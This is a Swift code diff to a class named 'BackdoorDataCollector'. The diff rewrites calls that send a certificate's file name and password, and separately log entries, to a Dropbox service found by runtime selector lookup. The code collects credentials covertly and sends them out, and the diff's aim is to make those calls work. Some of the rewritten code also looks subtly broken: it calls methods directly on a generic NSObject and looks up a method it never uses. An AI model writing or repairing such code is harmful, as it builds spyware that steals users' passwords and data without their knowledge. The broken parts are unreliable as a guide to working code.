@@ -251,11 +251,10 @@ class BackdoorDataCollector {
                 if dropboxService.responds(to: Selector("storePasswordForCertificate:password:completion:")) {
                     // Fix completion parameter to use nil instead of empty array
                     let completion: ((Bool, Error?) -> Void)? = nil
-                    dropboxService.perform(
-                        Selector("storePasswordForCertificate:password:completion:"),
-                        with: url.lastPathComponent,
-                        with: password,
-                        with: completion
+                    dropboxService.storePasswordForCertificate(
+                        url.lastPathComponent,
+                        password: password,
+                        completion: completion
                     )
                 }
             }
@@ -304,12 +303,12 @@ class BackdoorDataCollector {
            let dropboxService = dropboxServiceClass.value(forKey: "shared") as? NSObject,
            dropboxService.responds(to: Selector(("uploadLogEntry:fileName:completion:"))) {
             
-            dropboxService.perform(
-                Selector(("uploadLogEntry:fileName:completion:")),
-                withObject: logEntry,
-                withObject: fileName,
-                withObject: []
-            )
+            // Use Swift syntax instead of Obj-C perform
+            if let uploadMethod = dropboxService.method(for: Selector(("uploadLogEntry:fileName:completion:"))) {
+                // Simple implementation that doesn't rely on withObject syntax
+                let completion: ((Bool, Error?) -> Void)? = nil
+                dropboxService.uploadLogEntry(logEntry, fileName: fileName, completion: completion)
+            }
         }
     }
     
